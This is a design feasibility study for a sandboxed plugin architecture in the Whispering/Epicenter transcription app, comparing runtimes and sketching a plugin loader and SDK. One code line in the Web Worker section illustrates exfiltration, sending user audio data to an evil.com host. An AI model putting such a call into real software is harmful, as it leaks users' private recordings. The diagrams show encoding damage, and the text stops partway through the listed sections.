# Epicenter Plugin Architecture Feasibility Study

**Date:** 2026-01-22
**Status:** Research Complete
**Authors:** AI-assisted analysis

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Motivation](#motivation)
3. [Current Architecture](#current-architecture)
4. [Plugin Architecture Benefits & Risks](#plugin-architecture-benefits--risks)
5. [Industry Survey: How Others Do It](#industry-survey-how-others-do-it)
6. [Security & Sandboxing](#security--sandboxing)
7. [Runtime Options](#runtime-options)
8. [SvelteKit Integration](#sveltekit-integration)
9. [Epicenter as a Platform](#epicenter-as-a-platform)
10. [Whispering Decomposition](#whispering-decomposition)
11. [Signing & Distribution](#signing--distribution)
12. [OpenCode's Security Model](#opencodes-security-model)
13. [Functional Core / Imperative Shell + Event Sourcing](#functional-core--imperative-shell--event-sourcing)
14. [Actor Model for Multi-Core Parallelism](#actor-model-for-multi-core-parallelism)
15. [Real-Time Transcription Support](#real-time-transcription-support)
16. [Text-Based Media Editing](#text-based-media-editing)
17. [Generative Audio Insertion (AI Voice Synthesis)](#generative-audio-insertion-ai-voice-synthesis)
18. [Epicenter Vault Integration](#epicenter-vault-integration)
19. [Recommendations](#recommendations)
20. [Next Steps](#next-steps)

---

## Executive Summary

This document explores the feasibility of refactoring Whispering (and Epicenter apps generally) into a slim core with plugin/extension architecture. The research concludes that:

1. **Whispering is well-positioned** for plugin extraction due to existing service interfaces and registry patterns
2. **A capability-based security model** is recommended given Whispering handles sensitive data (audio, API keys)
3. **Sandboxed iframes + CSP** as the single runtime for all JS/TS plugins (simpler than Wasm, sufficient security for verified publishers)
4. **Epicenter can become a platform** where Whispering is just one app among many (Notes, Email, Journal)
5. **Shared YJS workspaces** (`@epicenter/hq`) enable cross-app data flow
6. **Partial decomposition** is recommended: keep core recording workflow together, split out management features
7. **jsrepo for distribution** with layered trust (integrity â†’ provenance â†’ verified publisher â†’ curated signing)
8. **Hybrid security model** combining OpenCode's permission UX with iframe sandboxing
9. **Actor Model** for multi-core parallelism and clean message-passing architecture
10. **Real-time transcription** supported with minimal changes to actor architecture (same actors, streaming messages)
11. **Text-based media editing** (Descript-style) is feasible using source-reference document model (informed by Audapolis)
12. **Generative audio insertion** (AI voice synthesis) integrates cleanly as Voice Synth Actor + TTS provider plugins
13. **Epicenter Vault (feat/epicenter-app)** supports text-based editing via `json` field type with TypeBox schemas for word-level segments
14. **Transcription services discard rich metadata** - Word timestamps, confidence, speaker diarization, and language detection are available but not stored; hybrid storage strategy recommended (normalized + optional raw)

---

## Motivation

### Primary Goals

| Goal                           | Description                                            |
| ------------------------------ | ------------------------------------------------------ |
| **One-click modification**     | Allow behavior changes without PR/build step           |
| **Lower contribution barrier** | Smaller, focused codebases are easier to contribute to |
| **Enable vibe-coding**         | Rapid prototyping without touching core                |
| **Keep core clean**            | Users customize without polluting main repo            |

### Additional Benefits Identified

| Benefit                  | Description                                               |
| ------------------------ | --------------------------------------------------------- |
| **A/B Testing**          | Users try alternative implementations safely              |
| **Community Innovation** | Power users prototype features that may graduate to core  |
| **Reduced Maintenance**  | Edge-case features maintained by interested parties       |
| **Faster Iteration**     | Plugin authors ship independently of core releases        |
| **Monetization**         | Premium plugins (enterprise integrations, specialized AI) |
| **Testing Isolation**    | Plugins tested independently; bugs isolated               |
| **Graceful Degradation** | Faulty plugins disabled without affecting core            |
| **Domain Customization** | Medical, legal, coding - specialized vocabularies         |
| **Offline Options**      | Restricted environments use only local plugins            |

---

## Current Architecture

### Whispering's Three-Layer Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  UI Layer (Svelte Components, Routes)                   â”‚
â”‚  - Consumes queries/mutations from query layer          â”‚
â”‚  - Displays WhisperingError in toasts                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Query Layer ($lib/query/)                              â”‚
â”‚  - TanStack Query for caching & reactivity              â”‚
â”‚  - Wraps service errors â†’ WhisperingError               â”‚
â”‚  - Injects settings/configuration                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Services Layer ($lib/services/)                        â”‚
â”‚  - Pure business logic, no UI dependencies              â”‚
â”‚  - Returns Result<T, ServiceError>                      â”‚
â”‚  - Platform-specific implementations via DI             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Existing Plugin-Friendly Patterns

| Pattern                | Location                    | Description                           |
| ---------------------- | --------------------------- | ------------------------------------- |
| Service Factory        | `services/*/`               | `createMyService()` â†’ `MyServiceLive` |
| Platform Detection     | `services/*/index.ts`       | `window.__TAURI_INTERNALS__` check    |
| Transcription Registry | `transcription/registry.ts` | Declarative service registration      |
| Command Registry       | `commands.ts`               | Array of command definitions          |
| Settings Schema        | `settings/settings.ts`      | ArkType validation with defaults      |

### Current Module Sizes

| Module                     | Lines  | Plugin Candidate? |
| -------------------------- | ------ | ----------------- |
| Transcription Services (9) | ~1,841 | Yes - Easy        |
| Completion Providers (6)   | ~615   | Yes - Easy        |
| Recordings Page            | ~1,364 | Yes - Medium      |
| Transformations Page       | ~2,000 | Yes - Medium      |
| Settings Pages             | ~3,941 | Partial           |
| CPAL Recorder              | ~334   | Yes - Easy        |
| FFmpeg Recorder            | ~716   | Yes - Medium      |

---

## Plugin Architecture Benefits & Risks

### Technical Risks

| Risk                     | Severity | Mitigation                                                 |
| ------------------------ | -------- | ---------------------------------------------------------- |
| **API Stability**        | High     | Semantic versioning, deprecation periods, adapter layers   |
| **Security**             | Critical | Sandboxing, permissions, code signing, curated marketplace |
| **Performance**          | Medium   | Resource limits, async boundaries, profiling               |
| **State Corruption**     | High     | Immutable state, event-driven, validation layers           |
| **Dependency Conflicts** | Medium   | Isolated plugin contexts, bundled independently            |
| **Tauri/Native Access**  | High     | Capability-based permissions, blessed APIs only            |

### Organizational Risks

| Risk                   | Severity | Mitigation                                             |
| ---------------------- | -------- | ------------------------------------------------------ |
| **Support Burden**     | High     | Clear plugin attribution, crash reporting with context |
| **Quality Variance**   | Medium   | Review process, ratings, verified publishers           |
| **Documentation Debt** | Medium   | Auto-generated API docs, example plugins               |
| **Fragmentation**      | Low      | Featured plugins, consolidation incentives             |

### Architectural Risks

| Risk                   | Severity | Mitigation                                        |
| ---------------------- | -------- | ------------------------------------------------- |
| **Over-Engineering**   | High     | Start with 2-3 extension points, expand on demand |
| **Leaky Abstractions** | Medium   | Comprehensive hooks, escape hatches with warnings |
| **Version Matrix**     | High     | Automated compatibility testing, SDK pinning      |

---

## Industry Survey: How Others Do It

### Comparison Matrix

| Platform              | Sandboxing                | Permissions           | Security | DX        |
| --------------------- | ------------------------- | --------------------- | -------- | --------- |
| **VS Code**           | Process isolation         | None (trust-based)    | Medium   | High      |
| **Chrome Extensions** | Process + isolated worlds | Declarative + runtime | High     | Medium    |
| **Obsidian**          | None                      | None                  | Low      | Very High |
| **Figma**             | iframe + minimal JS       | Network allowlist     | High     | Lower     |
| **Raycast**           | V8 isolate                | OS-level              | Medium   | High      |

### Key Lessons

**VS Code:**

- Contribution points pattern works well
- Activation events reduce startup cost
- Language Server Protocol enables reusable tooling

**Chrome Extensions (MV3):**

- Declarative permissions build user trust
- Manifest versioning is painful but necessary
- No remote code = auditable

**Obsidian:**

- Zero isolation is dangerous for sensitive data
- Relies entirely on code review + trust
- Maximum DX, minimum security

**Figma:**

- Split architecture (sandbox + iframe) is complex but secure
- Network allowlist is effective

**Raycast:**

- V8 isolates provide good isolation
- Open source requirement enables auditing
- Managed Node runtime reduces attack surface

---

## Security & Sandboxing

### Whispering's Unique Security Considerations

| Factor                   | Implication                                     |
| ------------------------ | ----------------------------------------------- |
| Handles audio recordings | Voice biometrics, conversations, meetings       |
| Stores API keys          | OpenAI, Anthropic, Groq = financial/access risk |
| Desktop app (Tauri)      | Filesystem, clipboard, global shortcuts         |
| Transcription = text     | PII, confidential information                   |

**Conclusion:** Whispering plugins are higher-risk than typical productivity apps.

### Recommended Security Model: Capability-Based

```typescript
// Plugin manifest
{
  "id": "transcription-groq",
  "capabilities": {
    "network": ["api.groq.com"],
    "settings:read": ["apiKeys.groq"],
    "audio:read": true,
    "transcription:provide": true
  }
}
```

### Security Tiers

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Tier 3: System Plugins     âš ï¸  HIGH PRIVILEGE       â”‚
â”‚  â€¢ CPAL recorder, FFmpeg                            â”‚
â”‚  â€¢ Require explicit approval + signing              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Tier 2: UI Plugins         ğŸ“¦ SANDBOXED             â”‚
â”‚  â€¢ Alternative pages, themes                        â”‚
â”‚  â€¢ Run in iframe, postMessage only                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Tier 1: Service Plugins    ğŸ”’ CAPABILITY-GATED     â”‚
â”‚  â€¢ Transcription, completion providers              â”‚
â”‚  â€¢ Run in Web Worker, scoped API access             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### API Key Protection

API keys should NEVER be exposed directly to plugins. Options:

1. **Core injects keys** - Plugin provides request builder, core adds auth
2. **Capability tokens** - Plugin receives scoped token, not raw key
3. **Proxy pattern** - Core makes HTTP requests on behalf of plugins

---

## Runtime Options

### Comparison Matrix

| Runtime             | Security  | Startup | Speed       | Memory   | Tauri Fit | DX        |
| ------------------- | --------- | ------- | ----------- | -------- | --------- | --------- |
| **Wasm (Extism)**   | Very High | <1ms    | Near-native | Low      | Easy      | Moderate  |
| **Deno (embedded)** | High      | ~50ms   | Fast        | +50MB    | Good      | Excellent |
| **QuickJS**         | High      | <1ms    | Slow        | Very Low | Easy      | Basic     |
| **Web Workers**     | Low\*     | ~1ms    | Fast        | Low      | Native    | Good      |
| **iframes + CSP**   | High      | ~100ms  | Fast        | Medium   | Native    | Good      |
| **Bun**             | None      | ~10ms   | Fast        | Medium   | Difficult | Excellent |
| **Node vm**         | None      | ~1ms    | Fast        | Low      | Native    | Good      |

\*Web Workers have unrestricted `fetch` - cannot be sandboxed for network access.

### Recommendation: Sandboxed iframes + CSP for All Plugins

After analysis, **sandboxed iframes with CSP** are recommended as the **single runtime** for all JavaScript/TypeScript plugins. This simplifies the architecture while providing sufficient security for Whispering's use case.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     PLUGIN RUNTIME STRATEGY                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                               â”‚
â”‚  ALL JS/TS PLUGINS (Service + UI)                            â”‚
â”‚  Runtime: Sandboxed iframe + CSP                             â”‚
â”‚  Security: Browser-enforced network restrictions              â”‚
â”‚  DX: Just write JavaScript/TypeScript                        â”‚
â”‚                                                               â”‚
â”‚  SYSTEM PLUGINS (CPAL, FFmpeg)                               â”‚
â”‚  Runtime: Native Rust (verified/signed only)                 â”‚
â”‚                                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Why iframe-Only (Not Wasm)?

| Factor                 | Wasm (Extism)               | Sandboxed iframe + CSP           |
| ---------------------- | --------------------------- | -------------------------------- |
| **Network security**   | No `fetch` (secure)         | CSP blocks unauthorized (secure) |
| **Memory isolation**   | Linear memory only          | Separate process                 |
| **CPU/DoS protection** | Fuel metering               | Timeout wrapper needed           |
| **Memory limits**      | Configurable                | Browser OOM handling             |
| **Plugin author DX**   | Need Rust/Go/AssemblyScript | Just JavaScript/TypeScript       |
| **Toolchain**          | Wasm compilation required   | Standard web tooling             |
| **Debugging**          | Wasm debugging tools        | Browser DevTools                 |
| **Startup time**       | <1ms                        | ~100ms                           |

**Key insight:** For Whispering's threat model (verified publishers, not anonymous marketplace), iframe security is sufficient and dramatically improves developer experience.

### Wasm vs iframe: Security Tradeoffs

| Attack Vector            | Wasm                   | iframe + CSP            | Risk Level |
| ------------------------ | ---------------------- | ----------------------- | ---------- |
| **Unauthorized network** | Blocked                | Blocked (CSP)           | None       |
| **Host memory access**   | Impossible             | Impossible              | None       |
| **DOM manipulation**     | Impossible             | Blocked (sandbox)       | None       |
| **Cookie/storage theft** | Impossible             | Blocked (sandbox)       | None       |
| **CPU exhaustion**       | Fuel metering          | **Timeout wrapper**     | Low        |
| **Memory exhaustion**    | Configurable limits    | **Browser OOM**         | Low        |
| **JS engine exploits**   | Smaller attack surface | **Larger surface**      | Very Low   |
| **Prototype pollution**  | Impossible             | **Contained to iframe** | Low        |

**Verdict:** iframe-only is acceptable when:

- Plugins come from verified publishers (not anonymous)
- Timeout protection is implemented
- You're not running a public marketplace with untrusted code

### Why NOT Web Workers?

Web Workers **cannot be sandboxed** for network access:

```typescript
// Web Worker can ALWAYS do this, regardless of any "bridge":
await fetch('https://evil.com/steal', { body: userAudioData });
```

- Deleting `fetch` is bypassable via `import()` or `eval()`
- CSP for Workers doesn't restrict `fetch` destinations
- Workers have unrestricted network access by design

**Sandboxed iframes ARE secure:**

```html
<iframe
	sandbox="allow-scripts"
	csp="connect-src api.groq.com; default-src 'none';"
></iframe>
```

Browser enforces CSP at the network layer - cannot be bypassed by JavaScript.

### Unified Plugin Loader

One loader for all plugins (service and UI):

```typescript
function loadPlugin(manifest: PluginManifest): PluginHandle {
	const iframe = document.createElement('iframe');

	// Security: sandbox + CSP
	iframe.sandbox = 'allow-scripts';

	const connectSrc = manifest.capabilities.network?.length
		? manifest.capabilities.network.join(' ')
		: "'none'";

	iframe.csp = `
    default-src 'none';
    script-src 'unsafe-inline' 'unsafe-eval';
    connect-src ${connectSrc};
    style-src 'unsafe-inline';
  `;

	// UI plugins: visible; Service plugins: hidden
	if (manifest.type === 'ui') {
		iframe.style.cssText = 'width:100%;height:100%;border:none;';
		container.appendChild(iframe);
	} else {
		iframe.style.display = 'none';
		document.body.appendChild(iframe);
	}

	iframe.srcdoc = buildPluginHTML(manifest, pluginCode);

	// Timeout protection for service plugins
	let timeoutId: number | null = null;

	return {
		call: (method: string, args: unknown) => {
			return new Promise((resolve, reject) => {
				const id = nanoid();

				// CPU protection: timeout
				timeoutId = window.setTimeout(() => {
					reject(new Error('Plugin timeout'));
					iframe.remove();
				}, manifest.timeout ?? 30_000);

				const handler = (e: MessageEvent) => {
					if (e.source === iframe.contentWindow && e.data.id === id) {
						clearTimeout(timeoutId!);
						window.removeEventListener('message', handler);
						if (e.data.error) reject(new Error(e.data.error));
						else resolve(e.data.result);
					}
				};
				window.addEventListener('message', handler);

				iframe.contentWindow?.postMessage({ id, method, args }, '*');
			});
		},

		terminate: () => {
			if (timeoutId) clearTimeout(timeoutId);
			iframe.remove();
		},
	};
}
```

### Plugin SDK

Simple SDK for plugin authors:

```typescript
// @whispering/plugin-sdk
type PluginMethods = Record<string, (...args: any[]) => Promise<unknown>>;

export function definePlugin(methods: PluginMethods) {
	window.addEventListener('message', async (e) => {
		const { id, method, args } = e.data;

		if (methods[method]) {
			try {
				const result = await methods[method](...args);
				parent.postMessage({ id, result }, '*');
			} catch (error) {
				parent.postMessage({ id, error: (error as Error).message }, '*');
			}
		} else {
			parent.postMessage({ id, error: `Unknown method: ${method}` }, '*');
		}
	});

	parent.postMessage({ type: 'PLUGIN_READY' }, '*');
}
```

### Example Plugin (Groq Transcription)

```typescript
// plugins/transcription-groq/index.ts
import { definePlugin } from '@whispering/plugin-sdk';

definePlugin({
	async transcribe(blob: Blob, options: { apiKey: string; model?: string }) {
		const formData = new FormData();
		formData.append('file', blob, 'audio.webm');
		formData.append('model', options.model ?? 'whisper-large-v3');

		// fetch() works because manifest declares: network: ['api.groq.com']
		// CSP blocks any other domain - no bridge needed!
		const response = await fetch(
			'https://api.groq.com/openai/v1/audio/transcriptions',
			{
				method: 'POST',
				headers: { Authorization: `Bearer ${options.apiKey}` },
				body: formData,
			},
		);

		const data = await response.json();
		return data.text;
	},
});
```

### When to Consider Wasm Instead

Upgrade to Wasm (Extism) if:

| Scenario                                         | Why Wasm                          |
| ------------------------------------------------ | --------------------------------- |
| **Public marketplace with anonymous publishers** | Stronger isolation, fuel metering |
| **Need hard CPU limits**                         | Wasm fuel metering                |
| **Need hard memory limits**                      | Wasm memory configuration         |
| **Paranoid about browser zero-days**             | Smaller attack surface            |
| **Plugin processes very sensitive data**         | Defense in depth                  |

For Whispering's current needs (verified publishers, community plugins), iframe-only is sufficient.

### iframe Startup Performance

iframe startup takes ~50-120ms due to:

```
1. DOM insertion          ~1-5ms    Create element, add to document
2. Process creation       ~20-50ms  Browser spawns isolated process
3. Document parsing       ~5-10ms   Parse srcdoc HTML
4. Script compilation     ~10-30ms  Parse and compile plugin JS
5. Script execution       ~5-20ms   Run plugin initialization
6. postMessage ready      ~1-5ms    Event listener registered
```

**Key insight:** This cost is paid **once per plugin** if plugins stay loaded.

### Mitigation Strategies

#### 1. Keep Plugins Loaded (Recommended)

```typescript
class PluginManager {
	private loadedPlugins = new Map<string, PluginHandle>();

	async getPlugin(id: string): Promise<PluginHandle> {
		// Reuse existing instance - instant
		if (this.loadedPlugins.has(id)) {
			return this.loadedPlugins.get(id)!;
		}

		// First load - pay 100ms once
		const handle = await this.loadPlugin(id);
		this.loadedPlugins.set(id, handle);
		return handle;
	}
}
```

#### 2. Preload Active Plugin at App Startup

```typescript
// During splash screen
async function initializePlugins() {
	const activeTranscriptionId = settings.value['transcription.selectedPlugin'];
	if (activeTranscriptionId) {
		await pluginManager.getPlugin(activeTranscriptionId);
	}
}
```

#### 3. Preload During Idle Time

```typescript
// Load other plugins when browser is idle
window.addEventListener('load', () => {
	setTimeout(() => {
		installedPlugins.forEach((manifest, i) => {
			requestIdleCallback(
				() => {
					pluginManager.getPlugin(manifest.id);
				},
				{ timeout: 5000 + i * 1000 },
			);
		});
	}, 2000);
});
```

### CSP Limitation with Warm Pools

Pre-warming iframe pools has a limitation: **CSP is fixed at iframe creation time**.

```typescript
// Can't change CSP after creation
const warmIframe = createIframe({ connectSrc: "'none'" });
// Later: Can't add api.groq.com - iframe already has restrictive CSP
```

**Solution:** Accept first-load cost per plugin, then keep loaded. For Whispering, users typically use one transcription provider consistently, so 100ms once is acceptable.

### Performance Summary

| Scenario                      | Latency | Strategy                         |
| ----------------------------- | ------- | -------------------------------- |
| **App startup**               | Hidden  | Load during splash screen        |
| **First transcription**       | ~100ms  | Preload active plugin at startup |
| **Subsequent transcriptions** | ~1ms    | Plugin stays loaded              |
| **Switching providers**       | ~100ms  | Acceptable (rare operation)      |

---

## SvelteKit Integration

### The Core Challenge

Svelte components must be **compiled before execution**. This creates tension with "one-click install."

### Solutions

| Approach                 | Security    | Performance | Integration | Recommendation       |
| ------------------------ | ----------- | ----------- | ----------- | -------------------- |
| **Pre-compiled bundles** | Trust-based | Excellent   | Full        | First-party plugins  |
| **Web Components**       | Good        | Good        | Medium      | Semi-trusted plugins |
| **iframe sandbox**       | Excellent   | Poor        | Limited     | Untrusted plugins    |
| **Runtime compilation**  | Poor        | Poor        | Full        | Not recommended      |

### Plugin Distribution Model

```
Plugin Author                    Plugin Registry               User
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€               â”€â”€â”€â”€
1. Write Svelte + TS             Hosts pre-compiled            1. Browse plugins
2. Run `npm run build`           bundles + manifests           2. Click "Install"
3. Push to GitHub/npm            GitHub Actions builds         3. Downloads bundle
                                 automatically                 4. Plugin loads
```

**Key insight:** "One-click install" doesn't require runtime compilation - it requires good distribution (GitHub releases + automated builds).

### Dynamic Route Registration

```svelte
<!-- src/routes/plugins/[...path]/+page.svelte -->
<script>
	import { page } from '$app/stores';
	import { pluginRegistry } from '$lib/plugins';

	let PluginComponent = $derived(
		pluginRegistry.getRouteComponent($page.params.path),
	);
</script>

{#if PluginComponent}
	<PluginComponent />
{:else}
	<p>Plugin not found</p>
{/if}
```

---

## Epicenter as a Platform

### Vision

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         EPICENTER PLATFORM                               â”‚
â”‚                                                                          â”‚
â”‚  "A personal data operating system where apps are just views            â”‚
â”‚   into your unified data vault"                                         â”‚
â”‚                                                                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                          â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚ Whispering  â”‚  â”‚   Notes     â”‚  â”‚    Email    â”‚  â”‚   Journal   â”‚   â”‚
â”‚   â”‚   (App)     â”‚  â”‚   (App)     â”‚  â”‚   (App)     â”‚  â”‚   (App)     â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚          â”‚                â”‚                â”‚                â”‚          â”‚
â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚
â”‚                                    â”‚                                    â”‚
â”‚                           â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”                           â”‚
â”‚                           â”‚  EPICENTER CORE â”‚                           â”‚
â”‚                           â”‚ â€¢ Vault (YJS)   â”‚                           â”‚
â”‚                           â”‚ â€¢ Services      â”‚                           â”‚
â”‚                           â”‚ â€¢ Settings      â”‚                           â”‚
â”‚                           â”‚ â€¢ UI Components â”‚                           â”‚
â”‚                           â”‚ â€¢ Plugin System â”‚                           â”‚
â”‚                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                           â”‚
â”‚                                                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### What Already Exists

| Package                   | Purpose                                    | Status        |
| ------------------------- | ------------------------------------------ | ------------- |
| `@epicenter/hq`           | YJS workspace system (tables, KV, actions) | Ready         |
| `@epicenter/vault-core`   | Data import adapters                       | Ready (alpha) |
| `@epicenter/ui`           | 50+ components                             | Ready         |
| `@epicenter/svelte-utils` | `createPersistedState`                     | Ready         |
| Whispering patterns       | Services, queries, settings                | Extractable   |

### Cross-App Data Flow

The killer feature: **Apps can reference each other's data**

```
Whispering Recording â”€â”€linkedToâ”€â”€â–¶ Notes App Note
        â”‚
        â””â”€â”€transformâ”€â”€â–¶ Email App Draft
                â”‚
                â””â”€â”€aggregateâ”€â”€â–¶ Journal App Entry
```

### Minimal Core API

```typescript
// @epicenter/core

// 1. App Registration
export function defineApp(config: AppConfig): EpicenterApp;

// 2. Workspace (re-export from @epicenter/hq)
export { defineWorkspace, createTables, createKv } from '@epicenter/hq';

// 3. Core Services
export const services = {
	notifications,
	toast,
	clipboard,
	sound,
	download,
	analytics,
};

// 4. Settings
export function defineSettings<T>(schema: T): Settings<T>;

// 5. Plugin System
export function registerApp(app: EpicenterApp): void;
export function queryAcrossApps(query: CrossAppQuery): Result[];
```

---

## Whispering Decomposition

### Feature Coupling Analysis

```
Recording Flow (TIGHT coupling - keep together)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[Record] â†’ [Transcribe] â†’ [Transform] â†’ [Deliver]
         All happen in ONE user action

Management Features (LOOSE coupling - can split)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[Browse Recordings]  [Edit Transformations]  [Settings]
         Separate user sessions
```

### Recommended Split

```
